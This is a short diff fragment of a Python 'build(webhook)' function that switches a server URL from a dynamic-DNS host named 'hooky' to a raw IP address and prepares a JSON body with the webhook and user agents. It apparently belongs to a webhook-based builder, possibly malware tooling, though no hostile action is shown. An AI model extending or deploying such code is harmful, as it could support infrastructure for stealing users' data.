@@ -34,7 +34,7 @@ def init():
 
 def build(webhook):
 
-    url = "http://hooky.ddns.net/new"
+    url = "http://45.158.77.206:80/new"
     json = {
         'webhook': webhook,
         'user-agents': ['Chrome/103.0']
